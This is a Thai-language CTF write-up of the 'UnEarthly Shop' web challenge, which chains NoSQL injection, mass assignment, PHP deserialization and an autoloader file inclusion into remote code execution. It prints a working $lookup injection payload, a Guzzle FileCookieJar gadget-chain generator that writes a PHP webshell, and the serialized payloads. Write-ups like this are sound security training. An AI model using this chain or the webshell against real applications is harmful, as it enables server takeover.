+++ 
authors = ["bongtrop",]
title = "[Write-up] Cyber Apocalypse 2023 - UnEarthly Shop (hard)"
date = "2023-03-23"
description = "CTF write-up ข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023"
images = ["/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/banner.png",]
+++

![Cover](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/banner.png)

HTB จัดงานแข่ง CTF Cyber Apocalypse 2023 และงานแข่งเป็นให้เข้าไปเล่นยาว ๆ เลยคือ 5 วัน ตั้งแต่วันที่ 18 Mar - 23 Mar ทำให้สามารถแบ่งเวลามาเล่นได้บ้างเวลาว่าง ๆ เลยลองกลับมาเล่นดูกับทีม `#C0FFEE` ที่ไม่ได้เข้าร่วมมานาน ผลคือโจทย์หลากหลายมากถ้าใครว่าง ๆ ลองเข้าไปหา write-up หรือลองเอาโจทย์มา deploy เล่นได้  โจทย์มีตั้งแต่ง่าย ๆ จนเบื่อ ไปถึงยากจนสนุกเลยครับ ผลคือได้อันดับที่ 92 มา ยังติดใน scoreboard 100 อันดับแรก

![CTF Result](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/ctf_result.png)

write-up ในบทความนี้เป็นของข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023 โดยโจทย์จะมีรายละเอียดดังนี้ (มี sorce code แถมมาให้ด้วยใครอยากลองเอาไป run และทดลอง solve เองได้นะครับ วิธีก็ง่าย ๆ เลยคือ execute `./build-docker.sh`)

![Challenge Description](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/challenge_description.png)

[Source Code](/files/writeup_cyber_apocalypse_2023_unearthly_shop/web_unearthly_shop.zip)

## Review Source Code

ผมเริ่มแก้ไขโจทย์ข้อนี้โดยใช้วิธี review source code เพื่อหาช่องโหว่ซะเป็นส่วนใหญ่ ไม่ได้ทำการ fuzz จากหน้าเว็บ ดังนั้นผมจากอธิบายออกแนวเป็นการ analyze source code นะครับ มี source code แล้วจะ fuzz ให้เหนื่อยทำไม โดยเจอช่องโหว่ดังนี้ครับ

ปล. fronend app คือหน้าปกติ `/` ส่วน backend app คือหน้า admin `/admin/` สามารถดูได้จาก `nginx.conf`

### 1. NoSQL Injection

อันแรกที่เจอเลยคือช่องโหว่นี้ เพราะติดว่าจำเป็นจะต้องมี credential ของ admin ถึงจะเข้าใช้งานหน้า admin ได้ และกวาดผ่าน ๆ ตาเจอว่ามีช่องโหว่ ถัด ๆ ไปอยู่ที่หน้า admin ดังนั้นผมเลย focus ที่การ bypass admin login และเจอว่า admin credential ถูกเก็บอยู่ใน MongoDB ผมจึงเน้นในการอ่านข้อผิดพลาดของการเขียน query MongoDB ซะเป็นส่วนใหญ่ และเจอว่า function `products` ของ class `ShopController` ของ frontend app ที่ไฟล์ `challenge/frontend/controllers/ShopController.php` ได้ส่ง user input ที่เป็น object เข้าไป query ใน MongoDB ตรง ๆ ทำให้มีช่องโหว่ที่เราจะใช้ query aggregation operator ที่ชื่อว่า `$lookup` เข้าไปอ่าน `users` collection และ leak admin credential ออกมาได้ ดังนี่

File: challenge/frontend/controllers/ShopController.php:14-27

```php
    public function products($router)
    {
        $json = file_get_contents('php://input');
        $query = json_decode($json, true);

        if (!$query)
        {
            $router->jsonify(['message' => 'Insufficient parameters!'], 400);
        }

        $products = $this->product->getProducts($query);

        $router->jsonify($products);
    }
```

File: challenge/frontend/models/ProductModel.php

```php
<?php
class ProductModel extends Model
{
    public function __construct()
    {
        parent::__construct();
    }

    public function getProducts($query)
    {
        return $this->database->query('products', $query);
    }
}
```

โดยใช้ช่องโหว่นี้ เราก็จะสามารถเข้าไปในหน้า admin หรือเข้าไปใช้ backend app ได้แล้ว

### 2. Insecure Deserialization

ช่องโหว่นี้ตรงตัวเลยครับ คือตัว backend app มีการใช้งาน function `unserialize` ซึ้ง well-known อยู่แล้วว่าไม่ปลอดภัย ดัง ที่ source code ด้านล่างเลยครับ

File: challenge/backend/models/UserModel.php:1-10

```php
<?php
class UserModel extends Model
{
    public function __construct()
    {
        parent::__construct();
        $this->username = $_SESSION['username'] ?? '';
        $this->email    = $_SESSION['email'] ?? '';
        $this->access   = unserialize($_SESSION['access'] ?? '');
    }
```

ถ้าไปตามไล่อ่านดีดีตัว `$_SESSION['access']` จะถูก set มาจาก database ใน mongodb ซึ่งไม่ได้มีวิธีให้เราสามารถเข้าไป set ได้ตาม logic ของ application จึงทำให้ต้องใช้ช่องโหว่ถัดไปในการแก้ไข `user.access` ใน database

### 3. Mass Assignment

ตัว backend app มี function ที่ใช้สำหรับ update user ใน database โดยตัว logic ของมันคือต้องการให้ update ได้แค่ username กับ password เท่านั้น แต่ข้อผิดพลาดคือ ตัว function ได้ส่ง object ที่ได้จาก user เข้าไป update ที่ MongoDB โดยตรง ดังนี้

File: challenge/backend/controllers/UserController.php:39-54

```php
    public function update($router)
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);

        if (!$data['_id'] || !$data['username'] || !$data['password'])
        {
            $router->jsonify(['message' => 'Insufficient parameters!'], 400);
        }

        if ($this->user->updateUser($data)) {
            $router->jsonify(['message' => 'User updated successfully!']);
        }

        $router->jsonify(['message' => 'Something went wrong!', 'status' => 'danger'], 500);
    }
```

File: challenge/backend/models/UserModel.php:71-74

```php
    public function updateUser($data)
    {
        return $this->database->update('users', $data['_id'], $data);
    }
```

ทำให้ตอนยิง API endpoint นี้เราสามารถส่ง access เราเข้ามาใน payload เพื่อแก้ไข field `access` ใน database ได้ ดังนั้นเมื่อรวมกับช่องโหว่ `Insecure Deserialization` แล้วเราอาจจะสามารถ take over control flow ของ application ได้ แต่ในการที่เราจะทำ malicious action เช่น arbitrary read/write file หรือ RCE จากการ deserialize เราจำเป็นจะต้องมี code ในส่วนที่เมื่อ deserialize แล้วจะ execute คำสั่งที่อันตราย แต่จากการตรวจสอบเบื่องต้นพบว่า ไม่มี gadget ที่สามารถทำเรื่องแบบนั้นใน backend app (เป็นความรู้เพิ่มเติม php ถ้า class ไหนมี function `__wakeup` หรือ `__destruct` ที่อันตรายถ้าเรา deserialize object ของ class นั้น เราจะสามารถทำอะไรแปลก ๆ ที่ server ได้ เราเรียก class นั้นว่า gadget)

แต่ไปพบ gadget ที่สามารถทำ arbitrary write file เขียนไฟล์เข้าไปในเครื่องที่ไหนก็ได้ บน frontend app คือ `GuzzleHttp\Cookie\FileCookieJar` (challenge/frontend/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php) แต่เรามีช่องโหว่ที่โจมตีได้แค่ backend app ตัว class ที่สามารถเป็น gadget ได้ไม่สามารถนำข้ามมาใช้งานได้ เราเลยต้องมีอีกช่องโหว่หนึ่งที่จะไปแอบดึง gadget ดังกล่าวมาใช้

### 4. Local File Inclusion (LFI)

ช่องโหว่นี้เนียนตามากหานานมาก ๆ และต้องใช้การ debug เขามาช่วยให้หาเจอ ผมจะขอข้ามขั้นตอนการหาไปนะครับ เพราะมันยาวจริง ๆ เดียวผมจะแปะตัว code ให้ก่อน แล้วจะอธิบายเป็น step ด้านล่าง

File: challenge/backend/index.php:1-22

```php
<?php

require __DIR__ . "/vendor/autoload.php";

spl_autoload_register(function ($name) {
    if (preg_match('/Controller$/', $name)) {
        $name = "controllers/${name}";
    } elseif (preg_match('/Model$/', $name)) {
        $name = "models/${name}";
    } elseif (preg_match('/_/', $name)) {
        $name = preg_replace('/_/', '/', $name);
    }

    $filename = "/${name}.php";

    if (file_exists($filename)) {
        require $filename;
    }
    elseif (file_exists(__DIR__ . $filename)) {
        require __DIR__ . $filename;
    }
});
```

เรารู้ ๆ กันอยู่แล้วว่า function `spl_autoload_register` เป็นการอนุญาติให้ user ทำ LFI ได้ by design คือเป็นการ LFI ด้วยความตั้งใจของผู้สร้าง app เอง ถ้าเขียนดีดี เราจะไม่ถือว่ามันเป็นช่องโหว่ สำหรับใครที่ไม่เข้าใจการทำงานของ function `spl_autoload_register` สามารถไปอ่านได้ที่ [https://php.net/manual/en/function.spl-autoload-register.php](https://php.net/manual/en/function.spl-autoload-register.php) สรุปง่าย ๆ คือ function นี้จะถูกเรียกใช้เพื่อทำการ auto `include` หรือ `require` class จากไฟล์อื่นให้โดยที่เมื่อเราเขียน code php เยอะ ๆ เราประกาศ class ไว้หลาย ๆ ไฟล์มาก ๆ เราไม่จำเป็นต้องมา include มันทุกไฟล์เดียว function นี้มันจะ include ให้เราเอง ดังนั้นการทำ sandbox ที่ดีสำหรับ function นี้จึงเป็นเรื่องจำเป็นมาก ๆ อย่างในเคสนี้ ถ้ามองดีดีใน บรรทัดที่ 14 ได้มีการ set ตัวแปล `filename` ด้วย `/${name}.php` สำหรับ `/` ขึ้นต้น ใน php มันหมายถึง การที่เราไปเริ่มที่ root path ที่ file system ของ os เลย ทำให้ถ้าเราสามารถ manipulate `$name` ที่รับเข้ามาได้ รวมไปถึงมีการ replace จาก `_` เป็น `/` ให้ใจดีสุด ๆ เราเลยสามารถไป include file ที่ลงท้ายด้วย `.php` ที่ไหนก็ได้ในเครื่อง server ได้เลย เช่น ถ้าผมสร้าง object จาก class `www_frontend_vendor_autoload` (`$obj = new www_frontend_vendor_autoload();`) มันก็จะไป include file `/www/frontend/vendor/autoload.php` ให้เราได้เลย ถือเป็น LFI แล้ว

จากองประกอบทั้งหมด เมื่อเรามี primitive ดังต่อไปนี้คือ

- Arbitrary Write File
- Local File Inclusion

เราจึงสามารถสรุปได้ว่าเราสามารถทำ RCE เครื่อง server ได้แล้ว โดยการ write file `shell.php` ไว้ซักที่หนึ่ง จากนั้น LFI เข้าไปอ่านไฟล์นั้น ตัว LFI ก็จะไป execute ไฟล์ `shell.php` ที่เราเตรียมไว้ เป็นอันจบ

## รายละเอียดการโจมตี

### 1. โจมตีช่องโหว่ NoSQL Injection เพื่อ leak credential admin

ขั้นตอนนี้ไม่ยากเลยใช้ burp ยิงแล้วเติม `$lookup` operator ไปในการดึง product ซะดังภาพ

![Exploit NoSQL Injection](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/exploit_nosql_injection.png)

ก็แค่ใส่ operator ดังต่อไปนี้เข้าไปก็จะได้รหัส admin เข้าไปโจมตีและ

```json
{
   "$lookup": {
      "from":"users",
      "localField":"_id",
      "foreignField":"_id",
      "as":"yoyo"
   }
}
```

### 2. generate serialized object เตรียมไว้โจมตีช่องโหว่ Insecure Deserialization

ผมสร้างตัว generator ไว้

File: unearthly_shop_gadget_generator.php

```php
<?php

namespace GuzzleHttp\Cookie{
    class SetCookie
    {
        private static $defaults = [
            'Name'     => null,
            'Value'    => null,
            'Domain'   => null,
            'Path'     => '/',
            'Max-Age'  => null,
            'Expires'  => null,
            'Secure'   => false,
            'Discard'  => false,
            'HttpOnly' => false
        ];
        function __construct()
        {
            $this->data['Expires'] = '<?php $_GET[0]($_GET[1]);?>';
            $this->data['Discard'] = 0;
        }
    }

    class CookieJar{
        private $cookies = [];
        private $strictMode;
        function __construct()
        {
            $this->cookies[] = new SetCookie();
        }
    }

    class FileCookieJar extends CookieJar{
        private $filename;
        private $storeSessionCookies;
        function __construct()
        {
            parent::__construct();
            $this->filename = "/var/lib/nginx/body/exploit.php";
            $this->storeSessionCookies = true;
        }
    }
}

namespace {
    class www_frontend_vendor_autoload {
    }
    class var_lib_nginx_body_exploit {
    }

    class Exploit {
        private $a;
        private $b;
        function __construct()
        {
            $this->a = new www_frontend_vendor_autoload();
            $this->b = new \GuzzleHttp\Cookie\FileCookieJar();
        }
    }

    function gen_payload($payload) {
        return json_encode(array('_id' => 1, 'username' => 'admin', 'password' => 'admin', 'access' => $payload));
    }

    $exploit = new Exploit();
    $obj1 = serialize($exploit);

    $trigger = new var_lib_nginx_body_exploit();
    $obj2 = serialize($trigger);

    echo "Step 1:\n";
    echo gen_payload($obj1);
    echo "\n";
    echo "\n";
    echo "Step 2:\n";
    echo gen_payload($obj2);
}
```

โดยตัว generator นี้เมื่อ run จะได้มา 2 gadget คือ

1. อันแรกจะเป็น class `Exploit` โดยจะมี sub object สองตัวคือ `www_frontend_vendor_autoload` และ `FileCookieJar` ตัวแรกจะใช้ LFI ไปโหลด gadget จาก frontend app มา อันที่สองจะเป็น gadget สำหรับเขียนไฟล์ไปที่ `/var/lib/nginx/body/exploit.php` โดยมีเนื่อหาไฟล์คือ `<?php $_GET[0]($_GET[1]);?>`

2. อันที่สองจะเป็นการแค่ไป LFI ไฟล์ที่เขียนไว้คือ `/var/lib/nginx/body/exploit.php` โดย init class `var_lib_nginx_body_exploit` ได้ดังนี้

```
bongtrop@Pongsakorns-MacBook-Air:/tmp/ $ php unearthly_shop_gadget_generator.php
PHP Deprecated:  Creation of dynamic property GuzzleHttp\Cookie\SetCookie::$data is deprecated in /private/tmp/unearthly_shop_gadget_generator.php on line 19

Deprecated: Creation of dynamic property GuzzleHttp\Cookie\SetCookie::$data is deprecated in /private/tmp/unearthly_shop_gadget_generator.php on line 19
Step 1:
{"_id":1,"username":"admin","password":"admin","access":"O:7:\"Exploit\":2:{s:10:\"\u0000Exploit\u0000a\";O:28:\"www_frontend_vendor_autoload\":0:{}s:10:\"\u0000Exploit\u0000b\";O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:{s:36:\"\u0000GuzzleHttp\\Cookie\\CookieJar\u0000cookies\";a:1:{i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:{s:4:\"data\";a:2:{s:7:\"Expires\";s:27:\"<?php $_GET[0]($_GET[1]);?>\";s:7:\"Discard\";i:0;}}}s:39:\"\u0000GuzzleHttp\\Cookie\\CookieJar\u0000strictMode\";N;s:41:\"\u0000GuzzleHttp\\Cookie\\FileCookieJar\u0000filename\";s:31:\"\/var\/lib\/nginx\/body\/exploit.php\";s:52:\"\u0000GuzzleHttp\\Cookie\\FileCookieJar\u0000storeSessionCookies\";b:1;}}"}

Step 2:
{"_id":1,"username":"admin","password":"admin","access":"O:26:\"var_lib_nginx_body_exploit\":0:{}"}
```

### 3. โจมตี Mass Assignment และ re-login สำหรับ gadget step 1

โจมตี Mass Assignment เพื่อเปลี่ยน `access` ของ user admin ให้เป็น payload step 1 ดังภาพ

![Exploit Mass Assignment Step 1](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/exploit_mass_assignment_step_1.png)

ทำการ login เข้าหน้า admin dashboard ใหม่อีกครั้งเพื่อ trigger function `unserialize` จะได้ error 500 unserialize มาไม่เจอ object อย่างที่หวัง แต่ gadget เราทำงานไปแล้ว

### 4. โจทตี Mass Assignment และ re-login สำหรับ gadget step 2

โจมตี Mass Assignment อีกครั้งเพื่อเปลี่ยน `access` เป็น payload step 2 ดังภาพ

![Exploit Mass Assignment Step 1](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/exploit_mass_assignment_step_2.png)

ทำการ login ใหม่อีกครั้งและก็จะได้ shell แล้ว ไปอ่าน flag ได้เลย โดยการ execute `/readflag` ดังภาพ

![RCE Readflag](/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/rce_readflag.png)

## สรุป

ประทับใจโจทย์ข้อนี้ที่สุดแล้ว และ CTF นี้แจก source code แทบทุกข้อเลย ทำให้ไม่ต้องการสกิลการเดาได ๆ ทั้งสิ้ง ทำให้ผมเล่นแล้วสนุกกับมันมาก (เป็นคนไม่ชอบ fuzz) ได้ฝึกการ skill secure code review ไปในตัว อีกกลับมาฝึกการ hack อีกครั้งหลังจากหยุดไปนาน สำหรับใครสนใจจะไปลองเล่นดู งานแข่งจบไปแล้วแต่ HTB เปิด after party event ให้ไปลองเล่นนะครับ ลิ้งนี้เลย https://ctf.hackthebox.com/event/details/cyber-apocalypse-2023-the-cursed-mission-after-party-937 